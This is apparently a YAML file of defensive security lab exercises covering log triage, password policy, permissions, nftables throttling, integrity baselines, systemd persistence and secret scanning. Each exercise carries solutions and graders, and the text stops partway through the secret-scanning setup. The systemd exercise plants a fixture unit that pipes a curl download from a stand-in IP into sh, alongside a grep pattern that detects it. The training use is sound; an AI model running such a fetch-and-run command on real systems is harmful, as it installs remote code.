track: defensive
module: Detection & monitoring
profile: offsec
order: 3
exercises:

- id: sec-016
  title: Failures across rotated logs
  difficulty: 1
  kind: build
  tags: [logs, ssh, awk]
  tutorial: |
    **Concept.** Log rotation splits one history across several files, some compressed. A count from only the newest file can name the wrong culprit, so analysis must cover the whole set.

    **Read up on:**
    - `ls -l` on a log directory — spot rotated and compressed siblings
    - `zcat -f` and `zgrep` — read compressed and plain files alike
    - `awk` — count by a field, using `NF` to count from the end of a line
    - `sort | uniq -c | sort -rn` — rank the results
  scenario: |
    **`/lab/logs`** holds the SSH authentication log of a bastion host together with its
    rotated copies.

    Which account had the **most failed password attempts** over the whole period?
    Write just the username to **`/lab/answer.txt`**.

    The account that tops the newest file is not necessarily the overall winner.
  hints:
    - "`ls -l /lab/logs` shows more than one file, and not all are plain text."
    - "`zcat -f /lab/logs/auth.log*` prints every file, compressed or not, as one stream."
    - "In a failure line the username sits a fixed number of fields before the end."
  solution: |
    Read every file as one stream, count the failures per username, and take the top one:

    ```bash
    zcat -f /lab/logs/auth.log* \
      | awk '/Failed password/ {c[$(NF-5)]++} END {for (u in c) print c[u], u}' \
      | sort -rn | head -1 | awk '{print $2}' > /lab/answer.txt
    ```
  setup: |
    python3 - <<'PY'
    import random, gzip, os
    names = random.sample(["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi",
                           "ivan", "judy", "mallory", "oscar", "peggy", "trent", "victor"], 5)
    u0, u1, u2, u3, u4 = names
    plan = {
        "auth.log":      {u0: 12, u1: 5, u2: 8},
        "auth.log.1":    {u1: 12, u0: 2, u2: 8, u3: 4},
        "auth.log.2.gz": {u2: 8, u1: 3, u4: 5},
    }
    day = {"auth.log": 8, "auth.log.1": 7, "auth.log.2.gz": 6}
    os.makedirs("/lab/logs", exist_ok=True)
    for fn, counts in plan.items():
        ev = []
        for u, n in counts.items():
            pre = "invalid user " if u in (u3, u4) else ""
            ev += ["Failed password for " + pre + u for _ in range(n)]
        ev += ["Accepted publickey for " + random.choice(names[:3]) for _ in range(random.randint(3, 6))]
        random.shuffle(ev)
        times = sorted(random.sample(range(86400), len(ev)))
        text = ""
        for t, msg in zip(times, ev):
            text += "Nov %2d %02d:%02d:%02d web sshd[%d]: %s from 198.51.100.%d port %d ssh2\n" % (
                day[fn], t // 3600, t // 60 % 60, t % 60, random.randint(1000, 30000), msg,
                random.randint(2, 250), random.randint(20000, 60000))
        p = "/lab/logs/" + fn
        if fn.endswith(".gz"):
            with gzip.open(p, "wt") as f:
                f.write(text)
        else:
            with open(p, "w") as f:
                f.write(text)
    open("/var/lib/kubelab/answer", "w").write(u2 + "\n")
    PY
    chown -R "$(lab_user):" /lab/logs
  check: |
    check_eq "top failing account named in /lab/answer.txt" "$(tr -d '[:space:]' 2>/dev/null </lab/answer.txt)" "$(cat "$KL_STATE/answer")"
  solve: |
    zcat -f /lab/logs/auth.log* | awk '/Failed password/ {c[$(NF-5)]++} END {for (u in c) print c[u], u}' | sort -rn | head -1 | awk '{print $2}' > /lab/answer.txt

- id: sec-017
  title: Who is scanning the website?
  difficulty: 2
  kind: build
  tags: [web, logs, triage]
  tutorial: |
    **Concept.** An access log records client, path and status per request. Scanners stand out by the variety of paths and errors they collect, not by volume, and the one request that succeeds matters most.

    **Read up on:**
    - Combined log format — which field holds address, path and status
    - `awk` — filter on the status field, key arrays on value pairs
    - `sort -u` and `uniq -c` — de-duplicate, then count
    - HTTP status classes — what 200 and 404 mean here
  scenario: |
    **`/lab/access.log`** is the access log of a small public website.

    One client probed the site for a large number of **different paths that don't
    exist**, and one of its probes was answered successfully.

    1. Write that client's IP address to **`/lab/ip.txt`**.
    2. Write the path that probe fetched successfully to **`/lab/path.txt`**.

    The noisiest address in the log is not necessarily the scanner.
  hints:
    - "Look at the status column (`$9` in this format) and the path column (`$7`)."
    - "Count *distinct* paths per address, not total requests."
    - "Once you know the address, filter its requests for status 200."
  solution: |
    Collect the unique address/path pairs that returned 404, then count per address:

    ```bash
    awk '$9 == 404 {print $1, $7}' /lab/access.log | sort -u \
      | awk '{c[$1]++} END {for (i in c) print c[i], i}' | sort -rn | head -1 \
      | awk '{print $2}' > /lab/ip.txt
    awk -v ip="$(cat /lab/ip.txt)" '$1 == ip && $9 == 200 {print $7}' /lab/access.log > /lab/path.txt
    ```
  setup: |
    python3 - <<'PY'
    import random
    ips = ["198.51.100.%d" % i for i in random.sample(range(2, 250), 24)]
    S, H, B, D = ips[:4]
    others = ips[4:]
    sens = ["/.env", "/backup.zip", "/db.sql", "/.git/config", "/config.php.bak"]
    hit = random.choice(sens)
    pool = ["/admin", "/admin/login", "/wp-login.php", "/phpmyadmin/", "/server-status", "/console",
            "/old/", "/test/", "/cgi-bin/test.cgi", "/api/v1/debug"] + ["/site%d/login.php" % i for i in range(60)]
    legit = ["/", "/index.html", "/about", "/products", "/contact", "/static/app.css", "/static/app.js",
             "/img/logo.png", "/blog/1", "/blog/2", "/blog/3", "/pricing"]
    ev = []
    probes = random.sample(pool, 36) + [s for s in sens if s != hit]
    for p in probes:
        ev.append((S, p, 404, 153))
    ev.append((S, hit, 200, random.randint(500, 90000)))
    for p in random.sample(pool, 12):
        ev += [(D, p, 404, 153)] * 6
    ev += [(B, "/img/old-logo.png", 404, 153)] * 60
    ev += [(H, random.choice(legit), 200, random.randint(300, 40000)) for _ in range(300)]
    for ip in others:
        for _ in range(random.randint(5, 30)):
            ev.append((ip, random.choice(legit), 200, random.randint(300, 40000)))
        if random.random() < 0.5:
            ev.append((ip, "/favicon.ico", 404, 153))
    random.shuffle(ev)
    uas = ["Mozilla/5.0 (X11; Linux x86_64) Firefox/126.0", "Mozilla/5.0 (Windows NT 10.0) Chrome/124.0",
           "curl/8.5.0", "python-requests/2.31.0"]
    t = 6 * 3600
    with open("/lab/access.log", "w") as f:
        for ip, p, st, sz in ev:
            t += random.randint(1, 8)
            f.write('%s - - [08/Nov/2025:%02d:%02d:%02d +0000] "GET %s HTTP/1.1" %d %d "-" "%s"\n' % (
                ip, t // 3600, t // 60 % 60, t % 60, p, st, sz, random.choice(uas)))
    open("/var/lib/kubelab/answer", "w").write("%s %s\n" % (S, hit))
    PY
    chown "$(lab_user):" /lab/access.log
  check: |
    read -r ip path <"$KL_STATE/answer"
    check_eq "scanner address in /lab/ip.txt" "$(tr -d '[:space:]' 2>/dev/null </lab/ip.txt)" "$ip"
    check_eq "successful probe path in /lab/path.txt" "$(tr -d '[:space:]' 2>/dev/null </lab/path.txt)" "$path"
  solve: |
    awk '$9 == 404 {print $1, $7}' /lab/access.log | sort -u | awk '{c[$1]++} END {for (i in c) print c[i], i}' | sort -rn | head -1 | awk '{print $2}' > /lab/ip.txt
    awk -v ip="$(cat /lab/ip.txt)" '$1 == ip && $9 == 200 {print $7}' /lab/access.log > /lab/path.txt

- id: sec-018
  title: Bring the password policy up to standard
  difficulty: 2
  kind: fix
  tags: [passwords, policy, config]
  tutorial: |
    **Concept.** Password policy lives in several small files, each with its own syntax, and commented-out lines do nothing. Auditing means finding the value actually in force.

    **Read up on:**
    - `man login.defs` — the aging settings and their units
    - `man pwquality.conf` — length, classes, dictionary checks
    - `man faillock.conf` — lockout threshold and unlock time
    - `grep -v '^#'` — show only active lines
    - `sed -i` — edit a setting in place
  scenario: |
    A copy of the host's password settings is in **`/lab/policy`**
    (`login.defs`, `pwquality.conf` and `faillock.conf`). Bring them up to the new standard:

    | file | requirement |
    |------|-------------|
    | `login.defs` | `PASS_MAX_DAYS` at most **90**, `PASS_MIN_DAYS` at least **1**, `PASS_WARN_AGE` at least **7** |
    | `pwquality.conf` | `minlen` at least **14**, `minclass` at least **3**, `maxrepeat` at most **3**, `dictcheck` enabled (**1**) |
    | `faillock.conf` | `deny` at most **5**, `unlock_time` at least **900** |

    Each setting must be defined **exactly once** as an active line, and every other
    setting in the files must stay as it is.
  hints:
    - "`grep -vE '^[[:space:]]*(#|$)' /lab/policy/*` shows only the lines that count."
    - "One of the required settings is not present as an active line at all."
    - "Anchor your `sed` patterns with `^` so a commented-out example is not rewritten."
  solution: |
    Replace the active values in place and add the one missing setting:

    ```bash
    cd /lab/policy
    sed -i -E 's/^PASS_MAX_DAYS.*/PASS_MAX_DAYS\t90/; s/^PASS_MIN_DAYS.*/PASS_MIN_DAYS\t1/; s/^PASS_WARN_AGE.*/PASS_WARN_AGE\t7/' login.defs
    sed -i -E 's/^minlen.*/minlen = 14/; s/^minclass.*/minclass = 3/; s/^dictcheck.*/dictcheck = 1/' pwquality.conf
    echo 'maxrepeat = 3' >> pwquality.conf
    sed -i -E 's/^deny.*/deny = 5/; s/^unlock_time.*/unlock_time = 900/' faillock.conf
    ```
  setup: |
    mkdir -p /lab/policy
    mx=$(shuf -e 99999 365 180 -n1); wa=$(shuf -e 0 3 5 -n1)
    ml=$(shuf -e 6 8 10 -n1); mc=$(shuf -e 0 1 2 -n1)
    dn=$(shuf -e 6 8 10 -n1); ut=$(shuf -e 60 300 -n1)
    cat >/lab/policy/login.defs <<EOF
    # Password aging controls
    #PASS_MAX_DAYS	60
    PASS_MAX_DAYS	$mx
    PASS_MIN_DAYS	0
    PASS_WARN_AGE	$wa
    UMASK		022
    ENCRYPT_METHOD SHA512
    EOF
    cat >/lab/policy/pwquality.conf <<EOF
    # Password quality
    # minlen = 12
    minlen = $ml
    minclass = $mc
    dictcheck = 0
    # maxrepeat = 3
    EOF
    cat >/lab/policy/faillock.conf <<EOF
    # Account lockout
    deny = $dn
    fail_interval = 900
    unlock_time = $ut
    EOF
    chown -R "$(lab_user):" /lab/policy
  check: |
    pv() { awk -v k="$2" '/^[[:space:]]*#/ {next} {gsub(/=/, " ")} $1 == k {val = $2} END {print val}' "$1" 2>/dev/null; }
    pc() { awk -v k="$2" '/^[[:space:]]*#/ {next} {gsub(/=/, " ")} $1 == k {n++} END {print n + 0}' "$1" 2>/dev/null; }
    L=/lab/policy/login.defs; Q=/lab/policy/pwquality.conf; F=/lab/policy/faillock.conf
    check "login.defs aging limits" 'a=$(pv $L PASS_MAX_DAYS); b=$(pv $L PASS_MIN_DAYS); c=$(pv $L PASS_WARN_AGE); [ "$a" -ge 1 ] && [ "$a" -le 90 ] && [ "$b" -ge 1 ] && [ "$c" -ge 7 ]'
    check "pwquality.conf strength settings" 'a=$(pv $Q minlen); b=$(pv $Q minclass); c=$(pv $Q maxrepeat); d=$(pv $Q dictcheck); [ "$a" -ge 14 ] && [ "$b" -ge 3 ] && [ "$c" -ge 1 ] && [ "$c" -le 3 ] && [ "$d" = 1 ]'
    check "faillock.conf lockout settings" 'a=$(pv $F deny); b=$(pv $F unlock_time); [ "$a" -ge 1 ] && [ "$a" -le 5 ] && [ "$b" -ge 900 ]'
    check "every required setting is defined exactly once" 'for p in "$L PASS_MAX_DAYS" "$L PASS_MIN_DAYS" "$L PASS_WARN_AGE" "$Q minlen" "$Q minclass" "$Q maxrepeat" "$Q dictcheck" "$F deny" "$F unlock_time"; do [ "$(pc $p)" = 1 ] || exit 1; done'
    check "other settings are untouched" '[ "$(pv $L UMASK)" = 022 ] && [ "$(pv $L ENCRYPT_METHOD)" = SHA512 ] && [ "$(pv $F fail_interval)" = 900 ]'
  solve: |
    cd /lab/policy
    sed -i -E 's/^PASS_MAX_DAYS.*/PASS_MAX_DAYS\t90/; s/^PASS_MIN_DAYS.*/PASS_MIN_DAYS\t1/; s/^PASS_WARN_AGE.*/PASS_WARN_AGE\t7/' login.defs
    sed -i -E 's/^minlen.*/minlen = 14/; s/^minclass.*/minclass = 3/; s/^dictcheck.*/dictcheck = 1/' pwquality.conf
    echo 'maxrepeat = 3' >> pwquality.conf
    sed -i -E 's/^deny.*/deny = 5/; s/^unlock_time.*/unlock_time = 900/' faillock.conf

- id: sec-019
  title: Anyone can write here
  difficulty: 3
  kind: fix
  tags: [permissions, find, hardening]
  tutorial: |
    **Concept.** Files and directories that every user can modify let a low-privilege account plant or alter content. Not every world-writable directory is a flaw, though: shared scratch spaces rely on an extra permission bit.

    **Read up on:**
    - `find -perm` — the `-mode` and `/mode` forms, combined with `!`
    - `man chmod` — change one permission class and keep the rest
    - The sticky bit — compare `/tmp`
    - `find -printf '%m %p\n'` — list octal modes
  scenario: |
    The web root **`/srv/kl/webroot`** has accumulated permissions that are too loose.

    Remove the ability for **other users** to write to every file and directory in it
    that doesn't need it. Nothing else may change: owner, group and every other
    permission bit must stay exactly as they are.

    The `shared/` directory is deliberately a common scratch space, so leave it as it is.
  hints:
    - "`sudo find /srv/kl/webroot -perm -0002` lists everything others can write."
    - "`ls -ld /tmp` and `ls -ld /srv/kl/webroot/shared` show what is special about a shared directory."
    - "`chmod o-w` changes only the write bit for others."
  solution: |
    Find regular files and directories writable by others, skip the sticky directory, and drop only the `o+w` bit:

    ```bash
    sudo find /srv/kl/webroot \( -type f -o -type d \) -perm -0002 ! \( -type d -perm -1000 \) -exec chmod o-w {} +
    ```
  setup: |
    python3 - <<'PY'
    import os, random
    root = "/srv/kl/webroot"
    dirs = ["uploads", "uploads/tmp", "cache", "conf", "scripts", "static", "static/img"]
    os.makedirs(root, exist_ok=True)
    for d in dirs + ["shared"]:
        os.makedirs(os.path.join(root, d), exist_ok=True)
    wmodes = [0o666, 0o777, 0o646, 0o756]
    omodes = [0o644, 0o664, 0o600, 0o755, 0o660]
    for i in range(34):
        d = random.choice(dirs)
        mode = random.choice(wmodes) if i < 10 else random.choice(wmodes + omodes)
        p = os.path.join(root, d, "f%d.%s" % (i, random.choice(["php", "txt", "conf", "sh", "css"])))
        with open(p, "w") as f:
            f.write("x%d\n" % random.randint(0, 10**6))
        os.chmod(p, mode)
    open(os.path.join(root, ".htaccess"), "w").write("Options -Indexes\n")
    os.chmod(os.path.join(root, ".htaccess"), 0o666)
    for i, m in enumerate([0o644, 0o644, 0o664]):
        p = os.path.join(root, "shared", "note%d.txt" % i)
        open(p, "w").write("shared\n")
        os.chmod(p, m)
    ws = random.sample(dirs, 3)
    for d in dirs:
        os.chmod(os.path.join(root, d), random.choice([0o777, 0o757]) if d in ws else random.choice([0o755, 0o775]))
    os.chmod(os.path.join(root, "shared"), 0o1777)
    os.chmod(root, 0o755)
    out = []
    for dp, dn, fn in os.walk(root):
        for n in dn + fn:
            p = os.path.join(dp, n)
            m = os.stat(p).st_mode & 0o7777
            if not (os.path.isdir(p) and m & 0o1000):
                m &= ~0o002
            out.append("%o %s" % (m, p))
    m = os.stat(root).st_mode & 0o7777
    out.append("%o %s" % (m & ~0o002, root))
    open("/var/lib/kubelab/ww.expected", "w").write("\n".join(out) + "\n")
    PY
  check: |
    check "only the shared directory is still writable by others" '[ -z "$(find /srv/kl/webroot \( -type f -o -type d \) -perm -0002 ! \( -type d -perm -1000 \))" ]'
    check "every other permission bit is unchanged" '[ "$(find /srv/kl/webroot \( -type f -o -type d \) -printf "%m %p\n" | LC_ALL=C sort)" = "$(LC_ALL=C sort "$KL_STATE/ww.expected")" ]'
  solve: |
    sudo find /srv/kl/webroot \( -type f -o -type d \) -perm -0002 ! \( -type d -perm -1000 \) -exec chmod o-w {} +

- id: sec-020
  title: Throttle the brute-forcer
  difficulty: 4
  kind: build
  tags: [nftables, rate-limit, netns, brute-force]
  tutorial: |
    **Concept.** A firewall can slow a password-guessing client by limiting new connections while other users and services stay untouched. The limit must be tracked per source address, or one noisy client uses up everyone's budget.

    **Read up on:**
    - `man nft` — `limit rate` and `burst`
    - Per-key limiting — dynamic sets and meters
    - `ct state new` — match attempts, not established traffic
    - `ip netns exec` — run commands in a namespace
  scenario: |
    Host **`srv`** (10.70.0.1) runs a stand-in SSH service on TCP **2222** and a web
    service on TCP **8080**. Clients **`cli`** (10.70.0.2) and **`cli2`** (10.70.0.3) share
    its segment. Someone is hammering port 2222 with connection attempts.

    Using **nftables inside `srv`**, allow each source address at most **10 new
    connections per second** to port 2222 (a small burst is fine) and drop the excess.
    Port 8080 and the other clients must be unaffected.
  hints:
    - "Put the rule in an `input` chain with `policy accept`; you are throttling, not blocking."
    - "A plain `limit` is shared by every client. Look at `meter`, or a set with the `dynamic` flag, keyed on `ip saddr`."
    - "Use `ip netns exec srv nft ...` and confirm with `ip netns exec srv nft list ruleset`."
  solution: |
    ```bash
    sudo ip netns exec srv nft -f - <<'EOF'
    table inet guard {
      chain input {
        type filter hook input priority filter; policy accept;
        tcp dport 2222 ct state new meter perip { ip saddr limit rate over 10/second burst 10 packets } drop
      }
    }
    EOF
    ```
  setup: |
    netns_new srv cli cli2 sw
    ip -n sw link add br0 type bridge
    ip -n sw link set br0 up
    i=0
    for pair in srv:1 cli:2 cli2:3; do
      n=${pair%:*}; o=${pair#*:}; i=$((i + 1))
      netns_link "$n" eth0 sw "p$i"
      ip -n sw link set "p$i" master br0
      ip -n "$n" addr add "10.70.0.$o/24" dev eth0
    done
    # A threaded listener with a large backlog, so without a rate limit a burst of
    # connections all complete the handshake (ncat accepts too slowly for that).
    cat >/srv/kl-listen.py <<'PYSRV'
    import socket, sys, threading
    def serve(port):
        s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("10.70.0.1", port)); s.listen(1024)
        while True:
            try: c, _ = s.accept()
            except OSError: continue
            threading.Thread(target=lambda c=c: (c.recv(16), c.close()), daemon=True).start()
    for p in (2222, 8080):
        threading.Thread(target=serve, args=(p,), daemon=True).start()
    threading.Event().wait()
    PYSRV
    on_reset 'systemctl stop kl-svc 2>/dev/null; systemctl reset-failed kl-svc 2>/dev/null; rm -f /srv/kl-listen.py'
    systemd-run --quiet --unit=kl-svc ip netns exec srv python3 /srv/kl-listen.py
    eventually 15 'ip netns exec srv ss -ltnH | grep -q ":2222 " && ip netns exec srv ss -ltnH | grep -q ":8080 "'
  check: |
    f=$(mktemp); d=$(mktemp -d)
    cat >"$f" <<'PY'
    import socket, select, sys, time
    host, port, n = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
    socks = []
    for _ in range(n):
        s = socket.socket()
        s.setblocking(False)
        s.connect_ex((host, port))
        socks.append(s)
    ok, pending, end = 0, set(socks), time.time() + 0.8
    while pending and time.time() < end:
        _, w, _ = select.select([], list(pending), [], 0.1)
        for s in w:
            if s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == 0:
                ok += 1
            pending.discard(s)
    print(ok)
    PY
    fl() { ip netns exec "$1" python3 "$f" 10.70.0.1 "$2" "$3" 2>/dev/null; }
    fl cli 2222 50 >"$d/a" &
    fl cli2 2222 4 >"$d/b"
    wait
    a=$(cat "$d/a"); b=$(cat "$d/b")
    sleep 2
    c=$(fl cli 8080 50)
    rm -rf "$f" "$d"
    check "a flooding source is throttled on 2222 (${a:-0} of 50 got through)" '[ "${a:-0}" -ge 3 ] && [ "${a:-0}" -le 30 ]'
    check "a second source is not affected by the flood (${b:-0} of 4)" '[ "${b:-0}" -ge 4 ]'
    check "port 8080 is not throttled (${c:-0} of 50)" '[ "${c:-0}" -ge 40 ]'
  solve: |
    sudo ip netns exec srv nft -f - <<'EOF'
    table inet guard {
      chain input {
        type filter hook input priority filter; policy accept;
        tcp dport 2222 ct state new meter perip { ip saddr limit rate over 10/second burst 10 packets } drop
      }
    }
    EOF

- id: sec-021
  title: Build a file integrity baseline
  difficulty: 3
  kind: build
  tags: [integrity, hashing, fim]
  tutorial: |
    **Concept.** Integrity monitoring records a trusted hash of every file, then re-checks later. A useful monitor notices modified files, deleted files, and files that were never in the baseline.

    **Read up on:**
    - `sha256sum` and `sha256sum -c` — write and verify a list
    - `find -print0` with `xargs -0` — hidden files and spaces in names
    - Relative versus absolute paths in a list
    - `diff <(...) <(...)` and `LC_ALL=C sort` — compare lists
    - Exit codes — how a script reports success
  scenario: |
    **`/srv/kl/conf`** holds configuration that should rarely change. Set up monitoring
    for it:

    1. Write a baseline to **`/lab/baseline.sha256`**: one SHA-256 line for **every
       regular file** under the directory (hidden files and names with spaces
       included), in `sha256sum -c` format with paths relative to the directory.
    2. Write **`/lab/verify.sh`**, which takes an optional directory argument
       (default `/srv/kl/conf`), checks that directory against the baseline and
       **exits non-zero** if any file was modified, deleted, or **added**. It exits 0
       when everything matches.
  hints:
    - "`sha256sum -c` alone does not notice a file that is missing from the list."
    - "Run the baseline command from inside the directory so the paths come out relative."
    - "Compare `find . -type f` with the file names recorded in the baseline."
  solution: |
    ```bash
    cd /srv/kl/conf
    find . -type f -print0 | sort -z | xargs -0 sha256sum > /lab/baseline.sha256
    cat > /lab/verify.sh <<'EOF'
    #!/bin/bash
    d=${1:-/srv/kl/conf}
    cd "$d" || exit 2
    sha256sum -c --quiet /lab/baseline.sha256 >/dev/null 2>&1 || exit 1
    [ "$(find . -type f | LC_ALL=C sort)" = "$(sed 's/^[0-9a-f]\{64\}  \*\?//' /lab/baseline.sha256 | LC_ALL=C sort)" ] || exit 1
    EOF
    chmod +x /lab/verify.sh
    ```
  setup: |
    python3 - <<'PY'
    import os, secrets
    root = "/srv/kl/conf"
    files = ["app.conf", "db.conf", ".hidden.conf", "my app.conf", "ssl/ca.pem", "ssl/server.conf",
             "nginx/nginx.conf", "nginx/sites/a.conf", "nginx/sites/b.conf", "cron/jobs.txt", "limits.d/app.limits"]
    for rel in files:
        p = os.path.join(root, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w") as f:
            for _ in range(4):
                f.write("# %s\nvalue=%s\n" % (secrets.token_hex(3), secrets.token_hex(8)))
        os.chmod(p, 0o644)
    for dp, dn, fn in os.walk(root):
        os.chmod(dp, 0o755)
    PY
  check: |
    t=$(mktemp -d)
    fresh() { rm -rf "$t/c"; cp -a /srv/kl/conf "$t/c"; }
    check "baseline covers every file and matches the tree" '[ "$(wc -l </lab/baseline.sha256)" -eq "$(find /srv/kl/conf -type f | wc -l)" ] && (cd /srv/kl/conf && sha256sum -c --quiet /lab/baseline.sha256)'
    check "verify.sh accepts an untouched copy" 'fresh; bash /lab/verify.sh "$t/c"'
    check "verify.sh flags a modified file" 'fresh; echo x >>"$t/c/.hidden.conf"; [ -f /lab/verify.sh ] && ! bash /lab/verify.sh "$t/c"'
    check "verify.sh flags an added file" 'fresh; echo x >"$t/c/extra.conf"; [ -f /lab/verify.sh ] && ! bash /lab/verify.sh "$t/c"'
    check "verify.sh flags a deleted file" 'fresh; rm "$t/c/my app.conf"; [ -f /lab/verify.sh ] && ! bash /lab/verify.sh "$t/c"'
    rm -rf "$t"
  solve: |
    cd /srv/kl/conf
    find . -type f -print0 | sort -z | xargs -0 sha256sum > /lab/baseline.sha256
    cat > /lab/verify.sh <<'EOF'
    #!/bin/bash
    d=${1:-/srv/kl/conf}
    cd "$d" || exit 2
    sha256sum -c --quiet /lab/baseline.sha256 >/dev/null 2>&1 || exit 1
    [ "$(find . -type f | LC_ALL=C sort)" = "$(sed 's/^[0-9a-f]\{64\}  \*\?//' /lab/baseline.sha256 | LC_ALL=C sort)" ] || exit 1
    EOF
    chmod +x /lab/verify.sh

- id: sec-022
  title: Suspicious systemd units
  difficulty: 4
  kind: fix
  tags: [systemd, persistence, forensics]
  tutorial: |
    **Concept.** A systemd service is a small text file, an easy persistence mechanism: the attacker only needs a unit that starts their program. Reviewing means reading what each `Exec` line launches, and from where, not trusting names.

    **Read up on:**
    - `man systemd.service` — the `Exec*` directives
    - `grep -n '^Exec'` — active command lines only
    - Writable locations — why running code from some directories is a red flag
    - `sha256sum` — fingerprint evidence before and after moving it
  scenario: |
    After a breach, the unit files from **`/etc/systemd/system`** were copied to
    **`/lab/units`** for review. Some of them start something that doesn't belong on
    a server.

    Move every **suspicious** unit file, unmodified, into **`/lab/quarantine/`**
    (create it). Legitimate units must stay in `/lab/units` and must not be edited.
  hints:
    - "`grep -n '^Exec' /lab/units/*.service` shows what each unit starts. Judge the command, not the description."
    - "Ask where each program lives and who could have put it there, and whether a command downloads something and runs it."
    - "A path that appears in a comment, a `PrivateTmp` setting, or a cleanup line is not the same as a program being started from it."
  solution: |
    Inspect the start-up commands and look for programs launched from world-writable locations (`/dev/shm`, `/var/tmp`, `/tmp`) or fetched and piped straight into a shell:

    ```bash
    mkdir -p /lab/quarantine
    grep -lE '^ExecStart(Pre|Post)?=.*(/dev/shm|/var/tmp|/tmp|\|[[:space:]]*sh)' /lab/units/*.service \
      | xargs -r mv -t /lab/quarantine
    ```
  setup: |
    python3 - <<'PY'
    import random, os
    sus_names = random.sample(["update-notifier-sync", "dbus-session-cache", "kworker-helper",
                               "systemd-resolved-helper", "cron-extra", "udev-monitor"], 3)
    def unit(desc, lines, user="root"):
        return ("[Unit]\nDescription=%s\nAfter=network.target\n\n[Service]\n%s\nUser=%s\nRestart=on-failure\n\n"
                "[Install]\nWantedBy=multi-user.target\n") % (desc, "\n".join(lines), user)
    ip = "203.0.113.%d" % random.randint(20, 220)
    sus = {
        sus_names[0]: unit("Kernel worker helper", ["ExecStart=/dev/shm/.kw-%d" % random.randint(100, 999)]),
        sus_names[1]: unit("Session cache daemon", ["ExecStart=/var/tmp/.sd-%d --quiet" % random.randint(100, 999)]),
        sus_names[2]: unit("System update check", ["ExecStartPre=/bin/sh -c 'curl -s http://%s/p | sh'" % ip,
                                                  "ExecStart=/usr/bin/sleep infinity"]),
    }
    ok = {
        "app-api": unit("Application API", ["WorkingDirectory=/opt/api", "PrivateTmp=true",
                        "ReadWritePaths=/var/tmp/api-cache", "ExecStart=/usr/bin/python3 /opt/api/server.py"], "api"),
        "backup-nightly": unit("Nightly backup", ["ExecStart=/usr/local/bin/backup.sh",
                               "ExecStop=/bin/rm -rf /tmp/backup-stage"]),
        "node-exporter": unit("Metrics exporter", ["ExecStart=/usr/local/bin/node_exporter --web.listen-address=127.0.0.1:9100"], "nobody"),
        "log-rotate-extra": unit("Extra log rotation", ["ExecStartPre=/usr/bin/test -d /var/log/app",
                                 "ExecStart=/usr/sbin/logrotate /etc/logrotate.d/app"]),
        "cache-warm": unit("Cache warmer", ["#ExecStart=/tmp/old-warm.sh", "ExecStart=/opt/cache/warm --once"], "cache"),
        "health-ping": unit("Local health ping", ["ExecStart=/usr/bin/curl -fsS -o /dev/null http://127.0.0.1:9091/ping"], "nobody"),
        "time-sync": unit("Clock synchronisation", ["ExecStart=/usr/sbin/chronyd -n"]),
    }
    os.makedirs("/lab/units", exist_ok=True)
    for name, text in list(sus.items()) + list(ok.items()):
        with open("/lab/units/%s.service" % name, "w") as f:
            f.write(text)
    open("/var/lib/kubelab/answer", "w").write("\n".join(sorted(sus)) + "\n")
    open("/var/lib/kubelab/sus.names", "w").write("\n".join(sus) + "\n")
    PY
    chown -R "$(lab_user):" /lab/units
    (cd /lab/units && sha256sum $(sed 's/$/.service/' "$KL_STATE/sus.names") | LC_ALL=C sort) > "$KL_STATE/sus.sha"
    (cd /lab/units && sha256sum -- *.service | LC_ALL=C sort) > "$KL_STATE/all.sha"
    LC_ALL=C comm -13 "$KL_STATE/sus.sha" "$KL_STATE/all.sha" > "$KL_STATE/ok.sha"
  check: |
    check "the suspicious units are quarantined, unmodified" '[ "$(cd /lab/quarantine && sha256sum -- *.service | LC_ALL=C sort)" = "$(cat "$KL_STATE/sus.sha")" ]'
    check "the legitimate units were left alone" '[ "$(cd /lab/units && sha256sum -- *.service | LC_ALL=C sort)" = "$(cat "$KL_STATE/ok.sha")" ]'
  solve: |
    mkdir -p /lab/quarantine
    grep -lE '^ExecStart(Pre|Post)?=.*(/dev/shm|/var/tmp|/tmp|\|[[:space:]]*sh)' /lab/units/*.service | xargs -r mv -t /lab/quarantine

- id: sec-023
  title: Scan the repository for secrets
  difficulty: 3
  kind: build
  tags: [secrets, grep, scanning]
  tutorial: |
    **Concept.** Committed credentials are found by pattern: key formats have recognisable shapes, and assignments to names like password give them away. Good scans ignore placeholders and environment references.

    **Read up on:**
    - `grep -rIE` — recursive extended regex, skipping binary files
    - Quantifiers such as `{16}` — fixed-length key bodies
    - PEM headers — private keys versus public keys and certificates
    - `grep -v` — drop placeholder values
    - `sort -u` — a clean list of paths
  scenario: |
    A project snapshot is in **`/lab/repo`**. Before it's published, find every file that
    contains a **real hard-coded secret**. Three kinds count:

    - an AWS access key ID (`AKIA` followed by 16 upper-case letters or digits),
    - a PEM **private** key block,
    - a password, token or secret **assigned a literal value**.

    Placeholders (such as `changeme` or anything marked as an example), empty values, and
    references to environment variables or secret stores are **not** secrets.

    Write the relative paths of the offending files, one per line, to **`/lab/leaks.txt`**.
  hints:
    - "Hidden files matter: `grep -r` includes them, shell globs do not."
    - "Three separate patterns, one per kind of secret, then merge the results with `sort -u`."
    - "For assignments, match the key name, a `=` or `:`, then at least eight value characters; filter out the placeholder words afterwards."
  solution: |
    Run one search per kind of secret, filter the placeholders, and merge:

    ```bash
    cd /lab/repo
    {
      grep -rIlE 'AKIA[0-9A-Z]{16}' .
      grep -rIlE -e '-----BEGIN [A-Z ]*PRIVATE KEY-----' .
      grep -rIiE "(password|token|secret)['\"]?[[:space:]]*[=:][[:space:]]*['\"]?[A-Za-z0-9/+_-]{8,}" . \
        | grep -viE 'changeme|example' | cut -d: -f1
    } | sed 's|^\./||' | sort -u > /lab/leaks.txt
    ```
  setup: |
    python3 - <<'PY'
    import os, random, secrets, string
    root = "/lab/repo"
    def hx():
        return secrets.token_hex(random.randint(8, 16))
    def akia():
        return "AKIA" + "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
    def pem(kind):
        return "-----BEGIN %s-----\n%s\n-----END %s-----\n" % (kind, "\n".join(secrets.token_hex(24) for _ in range(4)), kind)
    slots = {
        "config/db.yaml": (lambda: "database:\n  host: db.internal\n  user: app\n  password: %s\n" % hx(),
                           lambda: "database:\n  host: db.internal\n  user: app\n  password: ${DB_PASSWORD}\n"),
